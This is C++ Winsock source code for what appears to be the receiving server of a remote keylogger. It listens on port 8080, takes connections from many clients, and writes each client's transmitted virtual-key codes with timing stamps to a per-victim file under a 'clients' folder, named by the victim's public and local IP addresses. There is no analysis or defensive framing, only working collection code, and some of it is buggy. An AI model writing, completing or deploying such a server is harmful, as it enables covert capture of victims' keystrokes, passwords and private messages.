#include <iostream>
#include <fstream>
#include <ws2tcpip.h>
#include <winsock.h>

#include <thread>
#include <mutex>
#include <queue>
#include <chrono>
#include <vector>
#include <span>

#include <charconv>
#include <cstring> 

using namespace std;

vector<string> global_ips = vector<string>(); 

bool running = true;
void handleClient(SOCKET client, char* client_ip) {
    auto time = chrono::steady_clock::now();
    int own_idx = -1;
    ofstream file;
    while (true) {
        char buffer[1024];
        int received = recv(client, buffer, sizeof(buffer), 0);

        if (received == SOCKET_ERROR) {
            DWORD error_code = WSAGetLastError();
            if (error_code == WSAETIMEDOUT) {
                string ip = "not found";
                try {
                    ip = global_ips.at(own_idx);
                } catch (const std::out_of_range& ex) {}
                cout << "Client disconnected due a timeout: " << ip << endl;
            }
            closesocket(client);
            return;
        }
        if (received == 0) {
            closesocket(client);
            return;
        }
        if (buffer[0] == 'i' && buffer[1] == 'p') {
            std::string_view global_ip_addr{buffer+2};

            string path = "./clients/" + string(global_ip_addr) + "-" + string(client_ip) + ".txt";
            own_idx = global_ips.size();
            cout << path << endl;
            file.open(path, ios::in | ios::app);
            continue;
        }
        unsigned int vkCharNum = '\0';
        try {
            std::from_chars(buffer,buffer+received, vkCharNum);
        } catch (exception& err) {
            cout << err.what() << endl;
        }
        // cout << "VKCHARNUM: " << vkCharNum << endl;

        auto delta_time = chrono::steady_clock::now() - time;
        std::chrono::duration<double> delta_time_seconds = delta_time;
        file << '<' << to_string(delta_time_seconds.count()) << '>' << endl;
        file.write(buffer, received);
        file << endl;
        // file << ':' << static_cast<char>(MapVirtualKey(vkCharNum,MAPVK_VK_TO_CHAR)) << endl;
        time = chrono::steady_clock::now();
        // std::cout.write(buffer, received);
        // std::cout << std::endl;
    }

    closesocket(client);
}
void acceptClients(SOCKET serverSocket) {
    while (running) {
        struct sockaddr_storage client_addr; 
        socklen_t addr_size = sizeof(client_addr);
        SOCKET client = accept(serverSocket, (struct sockaddr*)&client_addr, &addr_size);
        DWORD timeout = 30000;
        setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        
        char ip_str[INET6_ADDRSTRLEN]; // Fits both IPv4 and IPv6 strings
        if (client_addr.ss_family == AF_INET) {
            struct sockaddr_in* s = (struct sockaddr_in*)&client_addr;
            inet_ntop(AF_INET, &(s->sin_addr), ip_str, sizeof(ip_str));
        } else { // AF_INET6
            struct sockaddr_in6* s = (struct sockaddr_in6*)&client_addr;
            inet_ntop(AF_INET6, &(s->sin6_addr), ip_str, sizeof(ip_str));
        }

        if (client == INVALID_SOCKET)
            break;

        std::thread(handleClient, client, ip_str).detach();
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);
    serverAddress.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Bind error: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen error: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Server started on 8080" << std::endl;

    std::thread acceptThread(acceptClients, serverSocket);

    while (true) {
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}